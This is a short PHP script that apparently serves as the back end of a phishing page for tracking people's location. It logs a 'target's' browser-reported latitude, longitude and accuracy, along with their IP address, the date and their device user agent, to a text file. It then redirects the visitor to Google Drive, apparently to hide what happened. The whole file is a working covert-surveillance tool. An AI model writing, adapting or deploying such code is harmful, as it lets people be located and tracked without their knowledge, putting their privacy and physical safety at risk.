<?php

  function getIP() {  
    //whether ip is from the share internet  
    if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
      $ip = $_SERVER['HTTP_CLIENT_IP'];  
    }  
    //whether ip is from the proxy  
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
      $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
    }  
    //whether ip is from the remote address
    else{
      $ip = $_SERVER['REMOTE_ADDR'];  
    }  
    return $ip;  
  }
  //target latitude
  $lat = $_POST['lat'];
  //target Longitude
  $long = $_POST['long'];
  //location accuracy
  $acc = $_POST['acc'];
  //ip
  $ip = getIP();
  //date
  $date = date("d/m/Y");
  //device info
  $deviceInfo = $_SERVER['HTTP_USER_AGENT'];
  
  //write downs all information in locations.txt file
  $file = fopen('logs.txt', 'a');
  fwrite($file, "[\n  Latitude: ".$lat);
  fwrite($file, "\n  Longitude: ".$long);
  fwrite($file, "\n  Accuracy: ".$acc);
  fwrite($file, "\n  IP: ".$ip);
  fwrite($file, "\n  Date: ".$date);
  fwrite($file, "\n  Device Info: {\n    ".$deviceInfo."\n  }\n]\n\n");
  fclose($file);
?>

<html>
  <head>
    <!--redirects to Google Drive-->
    <meta http-equiv="refresh" content="1;url=https://drive.google.com">
  </head>
</html>
